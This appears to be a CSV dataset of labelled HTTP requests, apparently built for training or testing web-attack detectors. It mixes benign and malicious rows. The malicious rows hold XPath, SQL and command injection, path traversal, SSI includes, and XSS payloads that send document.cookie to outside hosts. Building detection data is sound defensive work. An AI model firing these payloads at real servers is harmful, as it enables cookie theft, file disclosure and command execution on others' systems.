attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
XPath Injection,medium,5.0,malicious,"POST /lemtlleAl/9XaFBV2OvUjAvANUvgoJ/a8V/2atdE6giSmn/oH1.ahBuTE/vMIuy/taZk.Q/enzu4aZR@3lrB/l.Lz5upyTe5/ewSH/iUFEYgaTvGMHA.cfm? HTTP/1.0
Content-Length: 149
Content-Language: c
Content-Encoding: deflate
Content-Location: http://www.lscve.gov/anfiew/frrtxdca/1sarorE/hswh.cfm
Content-Type: application/x-www-form-urlencoded
Host: www.e3azguitgr.uk:80
Connection: close
Accept: application/x-tar, audio/x-wav, video/quicktime;q=0.8
Accept-Charset: *
Accept-Encoding: deflate, identity, compress
Accept-Language: *
Cache-Control: max-stale
Cookie: tkjylnnim=71842500;sczrynrehanDnc=615285375;lej7Roybnetb=3662601312;ofn2g=ear'    or  count( path/child::node()[position( )=((    i    +  j+k  + l  +1)]     |   path/child::*()[position()=(k+1)])=1  or     'i58tnU'   =' kNUeor'   or;au3deletewindow.open8kexec8=RiCynBtis
Cookie2: $Version=""0""
Date: Sat, 17 Jan 09 09:29:59 UTC
If-Modified-Since: Wed, 19 Dec 07 11:37:30 GMT
If-Match: ""XaS1IqMtFDROqAyuko6V""
If-Range: ""QPZ9Fmn1mI2zBPln""
Max-Forwards: 0
Proxy-Authorization: Basic dXBhclRqQTpoYm0yenN0
Authorization: Digest response=""0bFd58b0593D5FE14ae4B3436beb1789""
Referer: http://teai.st/srtefo/cuAQ/e8itl/e7xeu.avi
User-Agent: Mozilla/5.4 (Machintosh; U; Mac OS X 3.3; fm-na; rv:8.1.0) Gecko/53638798
UA-Color: color16
Via: 6.0 92.160.6.29, FTP/7.2 www.h93n2eo.htm
Transfer-Encoding: compress

Q8.eoUq5=ol&featnatoah=nl5ttaavhadeoi&T8nyrd=967978&tumh=tperlctnsuhec&ttlwejpiNoahy=7o&f8linkcopy=tOl&etcCc8ssfnampoi=linkw5ratws&tIurceeft2o=yNUuEL",50094,1518,xml_test-50094,pkdd,
XSS,medium,3.5,malicious,"PUT /eH32MyaW/_o/njCbb_pk@-/srWdvL/gdtpa/50lt@LP15@Z/s5nBgQhFQN0wSoIDPq/syATUgbt6tMuse/rRJJRd@Bz06yb6f5R.E/@Z_binZJcEGKposition3R.php3? HTTP/1.0
Content-Length: 226
Content-Language: yteo,63nrr9is,g
Content-Encoding: gzip
Content-Location: http://o3ts3T.net/0elz4/a1twfI/nr8po10l/nodAian.fgf
Content-MD5: Y29zdGVuZGxtc2VBdG1wdA==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 30 May 07 09:14:02 CET
Host: www.wsnTids.cz
Connection: close
Accept: */*
Accept-Charset: cp-932, iso-8859-8, windows-1250, windows-1257;q=0.1
Accept-Encoding: 
Accept-Language: *;q=0.3
Cache-Control: no-cache
Client-ip: 167.21.97.69
Cookie: uir2tiNafuid2ad=l;ueujlwMeitbig=7D68Qq;imeods1k=p8L;seyeOliiniao=3735
Cookie2: $Version=""5""
Date: Tue, 01 Feb 05 11:24:17 CET
ETag: ""UKLTiRifEJ0N6r4cGMc""
Expect: 100-continue
If-Modified-Since: Wed, 24 Nov 04 11:17:59 CET
If-Unmodified-Since: Sun, 08 Apr 07 13:39:35 GMT
If-Match: *
If-None-Match: *
Max-Forwards: 21
MIME-Version: 0.7
Pragma: vzn3nfq=dedSpl
Proxy-Authorization: Basic ZXlnUzpkb050ZWh4
Range: 01606-3,-17,99-
Referer: http://isim8.it/rdnaash/pxpoa3r/deEtai/wrffhny.pdf
Trailer: User-Agent
User-Agent: <object   classid  ="" clsid:...    ""  codebase =   ""   javascript:  [window.open('http://73.67.207.88/tiil.msf'+document.cookie);]  ""    >
UA-Disp: 348,337,32
Via: HTTP/3.7 www.saahne.js
Transfer-Encoding: nyeecl; 2lmoriam=ssit37ue
Upgrade: eMe/4.0, mna/3.4
X-Forwarded-For: 96.52.7.71
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

bma8ttridn8ure=1216001&in=s.Rl8jL&t5U=e45r&iroaizlLiedts=84hot4oorEt&ntditeYhrIy=13552710&dulei=01244&tjnuaaun1p=yvBV6WUZrJ&nwiq=958&p7eaifrr=nTNtuj5bab2eteh&autcsuhAntahn=rcgedmijdtjin7acop&k8Iu=39280&wmlorcea=6dsunsrvarspaea",48173,1753,xml_test-48173,pkdd,
SQLi,medium,3.0,malicious,"GET /iv/HF/e4LA7i.html?CZoUDZ9Yj=exec++++xp_regwrite+++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27ahhnn%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&4wAh=isc&fh7Eoao1=o6a+rasock_streamfv%27serviceslocationttnnr&la5m=VEherolai3s&he=rV1qN&s8havingpEd=062793184 HTTP/1.1
Host: 145.187.122.214:80
Connection: close
Accept: */*;q=0.3
Accept-Charset: iso-8859-7, windows-1252;q=0.6, x-mac-korean;q=0.4, x-mac-roman;q=0.0
Accept-Encoding: 
Accept-Language: dl-hjnusn;q=0.8, reaf-iglbaima;q=0.5
Cache-Control: no-cache
Client-ip: 175.67.198.190
Cookie: EvLMMHU=l]sf;;imNriiwhesotdh= -;eao=cpinsertecho4;hYmNnata7oidbg= perl/c;homhYohi3r=aotAeijeseso;9ljb7=:
Cookie2: $Version=""16""
Date: Sat, 23 Apr 05 01:06:48 GMT
ETag: W/""G2puLN1UmKCx5WB9Ef""
Expect: 100-continue
If-Modified-Since: Tue, 18 Jul 06 01:34:39 GMT
If-Unmodified-Since: Wed, 31 Mar 04 10:23:10 UTC
If-Match: ""9ZYLA89ve9xKQ.Kx""
If-None-Match: ""WkeUE2OF866syH9gqE""
If-Range: ""@x4hYxC9ukkoLTw-k""
Max-Forwards: 43
MIME-Version: 0.3
Pragma: no-cache
Proxy-Authorization: Basic dDlhaW46dXFjcA==
Authorization: Basic ZGZvaTphZW5lbg==
Range: 56684-,-230
Referer: http://www.Obht.cz/gat2de0s/rt8dmes/rs1tn/te7u.swf
TE: trailers,gzip;q=0.0,deflate
User-Agent: Mozilla/1.7 (X11; U; Open BSD i386 8.4; hz-En; rv:1.5.5) Gecko/61899096
UA-CPU: StrongARM
UA-Color: color16
Via: uytu/5.4 www.wgae9.js, 7.1 www.lcgi1oee.jpg
Transfer-Encoding: compress
Upgrade: l5i/1.7, lDqw/9.3, ade/1.3, rst/9.9
Warning: 100 www.saeeiu.png ""ehgteoiulnle"" ""Tue, 31 May 05 03:38:13 GMT""
----: -------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",35052,1699,xml_test-35052,pkdd,
Path Traversal,medium,,malicious,"GET /rest/products/search?q=..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%2Fwinnt%2Fsystem32%2Fcmd.exe%3F%2Fc%2Bdir%2Bc%3A%5C HTTP/1.1
Host: localhost:3000
User-Agent: commix/v4.2.dev1 (https://commixproject.com)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded",,340,,final,
Path Traversal,medium,,malicious,"POST /profile HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close

search=../../../../../../../var/log/access.log&id=2105",,224,patt-path-traversal-1105,PayloadsAllTheThings,../../../../../../../var/log/access.log
,hard,-2.0,benign,"POST /effAhdT6iO-Y/c2s/1@CYYDaQ/eiftlbeeoi0lbTMfrsj/imrtie8/iQp7VCpLiBcst.tiff? HTTP/1.0
Content-Length: 120
Content-Language: u
Content-Encoding: compress
Content-Location: /we1e9s/adE1nme/aouN4ne/iumemE/eWnn.shtml
Content-MD5: UW5zZWNlTndOaGV6dDdMdg==
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 26 Aug 06 08:49:39 GMT
Last-Modified: Fri, 02 Jun 06 21:46:19 CET
Host: www.nohs.gov
Connection: keep-alive
Accept: image/png, image/*;q=0.1
Accept-Charset: us-ascii, iso-8859-9, x-mac-arabic;q=0.5
Accept-Encoding: identity
Accept-Language: tsea32ee-ettC;q=0.1, o6-nan;q=0.9, ss9eii-etihaml;q=0.7
Cache-Control: no-store
Client-ip: 136.220.245.74
Cookie: o2zsdhFAS5j=1396;egedi=5e6/o$iorMicsn];herde=9ytveeqyeanrrwfete
Cookie2: $Version=""1""
Date: Tue, 04 Mar 08 14:58:15 GMT
ETag: ""cRPrR_WMKHJ7ipmhoi""
Expect: 100-continue
From: eenhAhys@zepotsdfNt.it
If-Modified-Since: Thu, 14 Dec 06 06:16:55 GMT
If-Unmodified-Since: Thu, 22 Mar 07 06:35:08 GMT
If-Match: ""2rJj_fCrOzPgZxLfEM""
If-None-Match: *
If-Range: ""mdV@Om2a6qguKGv""
Max-Forwards: 7540
MIME-Version: 7.8
Pragma: emt='brmst'
Proxy-Authorization: Digest cnonce=""yoehanfr""
Authorization: Basic YXdxczpkYmhqZWk=
Range: 896403-560156,-23134
Referer: http://www.Lmwnet.st/bTsq5n/pzEs/snl0ar/nfsPa.asp
TE: trailers,gzip;q=0.3,deflate;q=0.3
Trailer: Accept
User-Agent: Mozilla/2.9 (compatible; MSIE 4.3; Solaris; 1hrgel)
UA-CPU: Sparc
UA-Disp: 905,734,16
UA-OS: WinNT
UA-Color: color32
UA-Pixels: 6900x1160
Via: ennd/0.5 173.107.206.79:640, HTTP/4.7 170.86.87.110, TzM3/0.9 www.obysmgee.shtml
Transfer-Encoding: gzip
Upgrade: tnoc/2.8, twh/6.6, d0clah/7.2
Warning: 029 www.TasA.js ""noEv8wnrwRfeseqNeptc"" ""Sat, 01 Nov 08 03:38:50 CET""
X-Forwarded-For: 152.216.247.81
X-Serial-Number: 194828763
----: --------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

t2mttm=srLwon1aXoru|&Yj93Vb-WA=12439204&8ent2tepes7eyz=hfa9&lue7ri=5YLN&OKZQ7TrS=7678040978&dge33dtEreaT5ta=nL5xFMmZmR",3958,1995,xml_test-3958,pkdd,
SQLi,medium,3.0,malicious,"POST /gi2nerT5ase1h/mLWff-7idrpuP/dIPkPisyKutw/tERlP2koVySg/1wrowYzse15/917EOYW-HpfCoq/ap/oa.msf? HTTP/1.1
Content-Length: 267
Content-Language: aaoei,oNtl3,eeetohnu
Content-Encoding: deflate
Content-Location: /dQaopeey.pl
Content-MD5: cHRpbWNpSWVrblFodDdsaQ==
Content-Type: application/x-www-form-urlencoded
Expires: Sun, 10 Jan 10 11:19:35 UTC
Last-Modified: Sun, 06 Apr 08 16:19:11 GMT
Host: 87.191.125.122:80
Connection: close
Accept: audio/basic
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *;q=0.4
Cache-Control: no-store
Client-ip: 33.190.206.236
Cookie: dluoi4mtghbe8=hrn;Jprocessing-instructionadminNU=maaeewho;dtnAnntofchlrdy=442
Cookie2: $Version=""4""
Date: Thu, 06 Jul 06 02:25:54 UTC
ETag: W/""fXwEEo9cRQPW3zV""
Expect: nvcrmt2
From: t0cih@nlhtfemb7.st
If-Modified-Since: Sat, 15 Oct 05 22:40:32 GMT
If-Unmodified-Since: Sat, 17 Jan 09 10:45:15 UTC
If-Match: ""iGC_BYX0E1ngwljI""
If-None-Match: ""AeL@y7tsGmd4QLQO-ywU""
If-Range: Sun, 31 Jul 05 18:27:55 UTC
Max-Forwards: 948
MIME-Version: 4.3
Pragma: ne=taavEa
Proxy-Authorization: Basic NkJjbTphZ3JsMmp3ZQ==
Authorization: NTLM YWUwYWQ5b2hzbXRkczBqc2dpN3RvcnNsMjU2aXNuZWhMbU5hYw==
Range: 78-403185
Referer: http://entc.uk/leMsaNt/emrtes/mcApaisv.jsp
TE: gzip,deflate
Trailer: Accept-Encoding
User-Agent: Mozilla/8.5 (compatible; bb6tsi; Linux i386; aasXoe)
UA-CPU: MIPS
UA-Disp: 848,1754,32
UA-OS: Mac OS X
UA-Color: color8
UA-Pixels: 054x8213
Via: 6.1 www.sEbs.htm
Transfer-Encoding: iiO1y
Upgrade: duea/0.0
Warning: 241 www.cdHIo.gif ""n9doishtsina4rYrfe"" ""Mon, 20 Aug 07 04:06:39 UTC""
X-Forwarded-For: 37.28.59.187
X-Serial-Number: 40748942
----: -------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

na8shse=xmlr&nsodaae4=4327&rYEb=resiatn&hioegte=ea n5&Ioe=OR     'hrni' LIKE   'Sim%'&aoeN9lrfir=S8nhvaicRsoqltena&dohl==8Jr4iasaito ne&nceBtaiEn4=e<e2ehek)t|e&snp=066330&ej48tn2ebe=6&Ec7Z9=fe&eBwewijsekiurn=0&grs2opU4piv=enQvqxbyE1&lpiaooSbnrcnA=57",41477,1998,xml_test-41477,pkdd,
XSS,medium,3.5,malicious,"GET /nielwzannmecie7/47coebnntrtnizTd/Caedeaauvrwa/t6hfNF61ZbE1KEbMSVRy/dTISO.j@7pKdnTWtum0N/O7/l0dBijYxkgfwFT2nZ.cgi?xnh=enawngeh&nmgectashitU=nap5shEc&mCrein=KPescript&wnHCYhwirmmioE=4e%5Da%7C%5BoM%286%5C&brod=2956975&oY3ab=0&tts8=%7Eut&eosruoF=nsMnnslImtoNo3&OnhNttEcsahfy=3agi&NOIh8_XTkwLI=lopenef&cirptaf8c=Oy1Ua&SIstdinj=8929&odea5Atrtopobae=+&ne7=o HTTP/1.0
Host: 180.89.111.26
Connection: close
Accept: text/xml, audio/x-wav
Accept-Charset: x-mac-hebrew;q=0.2, euc-cn;q=0.6, gb2312;q=0.6, windows-1254;q=0.8
Accept-Encoding: gzip
Accept-Language: *
Cache-Control: no-transform
Client-ip: 42.100.67.21
Cookie: mftSSe=206;9tuwnc2nenls=imstylepnaaIyoldse;4TpasswdPnph-w1I3s=4;zaR=1
Cookie2: $Version=""24""
Date: Tue, 19 Jun 07 16:36:02 UTC
ETag: W/""i1SzQL9_A_G6IGY""
Expect: 100-continue
From: u3eali@lfioeyoua2.it
If-Modified-Since: Wed, 13 Oct 04 13:18:59 CET
If-Unmodified-Since: Fri, 18 Feb 05 05:49:33 GMT
If-Match: ""azZgVZ@U8xVGB46nAqRs""
If-None-Match: ""bwy-yLhpczm2Jn2Gym""
If-Range: Wed, 02 Jul 08 12:42:25 GMT
Max-Forwards: 962
MIME-Version: 1.9
Pragma: no-cache
Proxy-Authorization: Digest username=""6LlGdn""
Authorization: Digest cnonce=""d2earh""
Range: 29-,197659-,4-7273
Referer: http://www.Sfa2.be/2eOt/n3hgdta/sed5v/aaonee/eerodegs.swf
TE: trailers,deflate,deflate;q=0.9
Trailer: Host
User-Agent: <img    src   =  ""   dees""onmouseover   =   ""[document.location.replace    ('http://www.tametati.com/cgi-bin/sideri.cgi'+document.cookie);]"" >
UA-CPU: PowerPC
UA-Disp: 7714,181,32
UA-OS: Win95
UA-Color: color8
UA-Pixels: 950x529
Via: 9.6 6.62.12.50, HTTP/0.7 www.ldtemnnn.css
Transfer-Encoding: compress
Upgrade: 1ssnt/2.7, Necil/0.4
Warning: 105 192.184.242.29 ""Ttdmeee"" 
X-Forwarded-For: 245.134.55.175
X-Serial-Number: 36731
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~",46610,1811,xml_test-46610,pkdd,
SSI,medium,5.0,malicious,"PUT /eIplnurdsMo6ad/eI3Usl34A3tiMCCL/aifbh4tthy/6ttlcby3eocqdnww/Yjnrr/unionpXRcatREV/jN6VO/s6v/hM3TrZsFK8oxMH/sotU/otlpeehah8/nkeeEthleegnn.swf? HTTP/1.1
Content-Length: 257
Content-Encoding: gzip
Content-Type: application/x-www-form-urlencoded
Host: 255.250.69.189
Connection: llbixetL
Accept: */*;q=0.3
Accept-Charset: iso-10646-ucs-2, x-mac-greek, iso-8859-5
Accept-Encoding: <!-- #include     virtual=""/var/log/httpd/access.log"" -->
Accept-Language: *
Date: Tue, 01 Apr 08 09:03:55 CET
ETag: ""dUDViYkUsEROtwTmV1""
If-Match: *
Max-Forwards: 429
Referer: /ohvo46/s7b5rds/ocot9/yiat/uttG.tar
TE: trailers
User-Agent: Mozilla/6.9 (Windows; U; Win 9x 8.2; nl-io; rv:0.4.7) Gecko/57952192
UA-CPU: PowerPC

mdedfc=&eandTeo7NiOlsds&oro=mit1staiNq7Wuu&el01m=beavOb&aOdsiuo3er=skechTotas&8ntrpsEshitcmI=a3owgetiau8hnw&wDkImC9a=tea&aeSKae=eaen] \fos\ieeurrO&op3pN=t0d&bcxmlEOAie=wesLDa6nt&ywy5aamnb2an=:drtiggfrea6posnuC&iqgY=68636417&3MWCJ4xibOH-=04siIaail7",39843,970,xml_test-39843,pkdd,
Command Injection,medium,,malicious,"POST /profile HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close

name=&& ls -l /etc/&id=1868",,184,patt-command-injection-0868,PayloadsAllTheThings,&& ls -l /etc/
,hard,-2.0,benign,"POST /gpPH-40pdacP11HqIG4G/eMsCPXyEm.asp? HTTP/1.0
Content-Length: 251
Content-Language: gd8qbiei
Content-Encoding: identity
Content-Location: http://www.QlulsO.org/hdh5/biedOpn/eyclI.exe
Content-MD5: bGlleW9IYmIzOGFldGVIOQ==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 17 Aug 06 05:16:50 CET
Last-Modified: Mon, 09 Apr 07 17:52:16 UTC
Host: www.gPrqn6ymRa.be
Connection: 5nsat
Accept: video/*
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *;q=0.7
Cache-Control: only-if-cached
Client-ip: 187.93.237.97
Cookie: acecmdnLzna=07868;nezboltCUltw=ht0;prae=orapsr+oet/cOstdin;udvCtEGnetcat_=56474831
Cookie2: $Version=""9""
Date: Sun, 07 Mar 10 01:34:08 UTC
ETag: ""xAn8A7w_qwd-Ao4RS@tB""
Expect: erePlwnn=tboel5n;75rtreh
From: 9mwiN@6woe1E.net
If-Modified-Since: Mon, 18 Feb 08 12:43:15 CET
If-Unmodified-Since: Sun, 02 Apr 06 09:50:30 CET
If-Match: *
If-None-Match: ""XjejdQqNjI9Ai3m""
If-Range: ""mjRhrpQ_vnNIzsrE5jS""
Max-Forwards: 478
MIME-Version: 3.1
Pragma: no-cache
Proxy-Authorization: Digest uri=http://www.efttzis.be/nlrez/ltpeh/rkieoIj.gif
Authorization: wsrgco euerToht=tdrirs
Range: 1757-72,-28304,0-
Referer: http://www.sS1ct.org/eeoetd/vjte/terukm.mpg
TE: trailers,trailers
Trailer: If-Unmodified-Since
User-Agent: Mozilla/5.1 (X11; U; Unix 7.9; Qa-sb; rv:6.0.4) Gecko/87452952
UA-CPU: x86
UA-Disp: 109,747,8
UA-OS: Windows NT
UA-Color: color32
UA-Pixels: 425x376
Via: 8.7 www.rcaca.jpg, 0.0 www.asyp.png, FTP/8.1 170.237.121.148
Transfer-Encoding: identity
Upgrade: zedlh/8.1, naR/6.0, eeufs/3.6, reei/8.9, fshaut/4.2
Warning: 865 www.coRthr.shtml ""oCpstedTscbho"" ""Thu, 07 Dec 06 06:32:02 GMT""
X-Forwarded-For: 247.63.27.49
X-Serial-Number: 095672914255730
----: --------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

oecchwo4o=94327590&a2=c>&AigYSs1PD=wp-eewtddi2n~ao4&nve0njvlg=FhOmeyE&ttDegwiro=ekg98&pOS0@jmBWQ=066302013&Esedg3aauAGe=7&rhuaemaen=>ebody< st/ss&jm&vpeno1t5wis5i=hgmw8tg&eaiiwr3oi=trZykMc&qxireplaceF0dxnystyle=7ebei9idatnet&etefaaqm=52754",4785,2042,xml_test-4785,pkdd,
Command Injection,medium,4.0,malicious,"PUT /zUeI/sotqgnpcean/emcRiGA/qpp8AnoaubsgO/iX/l-n1DhDw12G/YO/lf2htosJe8r/eaEbuaTiaelasB7sw/8HDDinsertinputBPm_gi/QsJJFWescriptZWFl/rrTLqBq7Ts0IuN1.msf? HTTP/1.0
Content-Length: 83
Content-Language: nxah4
Content-Encoding: deflate
Content-Location: http://www.tCreshc.fr/8wjeabra/6jsrn/a4tB.exe
Content-MD5: c2llb09va0hoYXp1cDh1cw==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 08 Apr 05 14:30:45 UTC
Last-Modified: Thu, 05 Jan 06 22:46:04 CET
Host: www.seRenrya.fr
Connection: close
Accept: application/*;q=0.4, application/zip;q=0.8, text/*;q=0.9
Accept-Charset: macintosh
Accept-Encoding: gzip;q=0.2, gzip, identity;q=0.7
Accept-Language: a1os-ioim;q=0.6, ebs-bNEl;q=0.5
Cache-Control: no-cache
Client-ip: 157.21.58.178
Cookie: suz= ;    echo      ;   w     ;     uname  -a    ;  id
Cookie2: $Version=""04""
Date: Tue, 27 Nov 07 02:17:09 CET
ETag: W/"".QW9ECthMnGGMsec""
Expect: litFqehh
If-Modified-Since: Thu, 17 Jul 08 20:18:30 GMT
If-Unmodified-Since: Mon, 21 Nov 05 10:29:19 CET
If-Match: ""woJArvzK7FeBRYbYdr""
If-None-Match: ""9ew0m7Ka.79E@uBUhc.r""
If-Range: Mon, 18 Oct 04 13:55:07 UTC
Max-Forwards: 930
Pragma: no-cache
Proxy-Authorization: Nrtb80 8aotecrx=cnmhaa
Authorization: lyri 3rsewb=eorlHfW
Range: -3,3-7,27-13
Referer: http://www.otsanj2.be/eUof/eeuen/hUablrt.cfm
TE: trailers,deflate;q=0.7
Trailer: Connection
User-Agent: rLYN-XGjx- http://www.nTeTe.st
UA-Disp: 7880,0277,8
UA-OS: Windows 95
UA-Pixels: 7102x9023
Via: HTTP/9.8 79.227.46.5, HTTP/4.3 www.olrum.jpeg
Transfer-Encoding: ytaT; eash=hjaX
Upgrade: m6flre/8.6, rdtt6n/9.3, sRis/6.2, zHe/7.7
Warning: 587 www.het8r1.gif:387 ""tdreuBf"" 
----: ----------------

i1aeaelaetiosnu=xmca6eoulettegs&RljaPFPA=sse7a&q0taehtLeh=6773556&lrn6rnbwesqPxuh=i",43635,1777,xml_test-43635,pkdd,
,hard,0.0,benign,"POST /tXq9N9rF3t/npMIrTv../ni8hlge/nbccorwlol/8Csf/fnu2hbtotmoA/7d/ethn/ahlroae2nmti/3dpK/9r04cfg/nabaeEhwnar.bin? HTTP/1.0
Content-Length: 166
Content-Language: i6kqe,nk
Content-Encoding: compress
Content-Location: http://shndaaih.de/vmei/nEehaaf/hsrt.swf
Content-MD5: ZzRpaDM5TW5pdW9zZWRwdA==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 04 Jan 06 10:41:20 UTC
Last-Modified: Sun, 02 May 10 17:18:33 UTC
Host: 239.23.43.12
Connection: close
Accept: audio/*, audio/x-wav;q=0.3
Accept-Charset: x-mac-arabic;q=0.3, utf-8, iso-2022-kr;q=0.2, iso-8859-4;q=0.2, windows-1251;q=0.7
Accept-Encoding: *
Accept-Language: *
Cache-Control: only-if-cached
Client-ip: 194.50.167.30
Cookie: Rtea=execd;xtermHaWorcpiU=u);yfaNiydsyeaa=rlibk5ns;sso6hieiAsno=tkmoj;4s=6;hoFaaowsp=aigjbnrostnodee
Cookie2: $Version=""00""
Date: Fri, 05 Jan 07 13:11:02 CET
ETag: ""-22cLJtVOxTieij""
Expect: 100-continue
From: afrre@eioecipcc.biz
If-Modified-Since: Wed, 30 Apr 08 11:15:07 CET
If-Unmodified-Since: Fri, 20 Jun 08 14:30:33 GMT
If-Match: ""0yMHa5YYPD43Dam34c""
If-None-Match: *
If-Range: *
Max-Forwards: 1
MIME-Version: 0.4
Pragma: sedls=eioa
Proxy-Authorization: NTLM MmJ1c2VQc29jYTQzQmFtTW1mQTNwc2l0bmF0bnRta2V1ZVJuZFN6ZWl3Zmhi
Authorization: Digest qop=auth
Range: 0284-605
Referer: /b6ne/10edle/fmcNiubu/tsdll/hEtH.mpeg
TE: trailers
Trailer: User-Agent
User-Agent: Mozilla/2.8 (Machintosh; U; Mac OS X 1.5; jc-in; rv:2.6.8) Gecko/77426901
UA-CPU: Sparc
UA-Disp: 9422,2675,16
UA-OS: FreeBSD
UA-Color: color16
UA-Pixels: 795x581
Via: HTTP/8.9 24.65.199.174, 7.0 237.209.209.45
Transfer-Encoding: ltat; nlcsoR6e=TotE
Upgrade: icEr/0.2, qtj/3.8, ic5/3.5
Warning: 457 58.248.149.253 ""ghot6raooeReo"" 
X-Forwarded-For: 115.221.199.254
X-Serial-Number: 534170749
----: ---------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

fxAA9rHsu=;Tpsor$t&k5yRVsK37rXo=2epnodesaevaliEdr&nh2n5tvnh=87665&rhvec=ynehta8eAr&88=|wcuOieWte:dfn&eoean=35200&JZKVj7=9115&oboeeqI2yheg=es\t&efLslqoEEbe=7",7894,2041,xml_test-7894,pkdd,
SSI,medium,3.5,malicious,"PUT /ecwk-1J_G3l6p.cfm? HTTP/1.0
Content-Length: 49
Content-Language: e,am
Content-Encoding: identity
Content-Location: http://asriao7.biz/ndetIp/sdtht.bin
Content-MD5: eXJobUFrbk9yZGk5dWZybA==
Content-Type: application/x-www-form-urlencoded
Last-Modified: Wed, 24 May 06 18:59:31 CET
Host: 162.188.222.81
Connection: keep-alive
Accept: application/postscript;q=0.4, video/mpeg;q=0.2
Accept-Charset: *;q=0.4
Accept-Encoding: gzip;q=0.7, identity;q=0.1, identity, gzip, identity;q=0.5
Accept-Language: <!--    #include  virtual=""c:\winnt\system.ini"" -->
Cache-Control: max-age=6383
Client-ip: 81.128.85.227
Cookie2: $Version=""334""
Date: Fri, 05 Mar 04 08:52:04 CET
Expect: omg8lsl
If-Unmodified-Since: Tue, 07 Oct 08 19:27:57 UTC
If-Range: *
Max-Forwards: 81
Pragma: no-cache
Authorization: nw4t vsoe=eaeeo8
Referer: /Hiadof/Rtnsil/dttr/Acl9oWd.js
TE: trailers,gzip;q=0.3,deflate
User-Agent: Mozilla/2.9 (Windows; U; Windows NT 5.2; dh-va; rv:1.3.9) Gecko/26906445
UA-Disp: 8526,085,32
UA-Color: color16
Upgrade: hzo7/9.3, Eisrod/4.0, ejx/1.1, aH0t/6.3, ns3en/0.7
Warning: 949 116.210.136.159 ""clysplwnhtrpns7zei"" 
X-Serial-Number: 86139619564000429031

nStandJwpe6=lnw&eu4wuanz9wseyt=lNabfaq6nbpdsrohWt",40704,1235,xml_test-40704,pkdd,
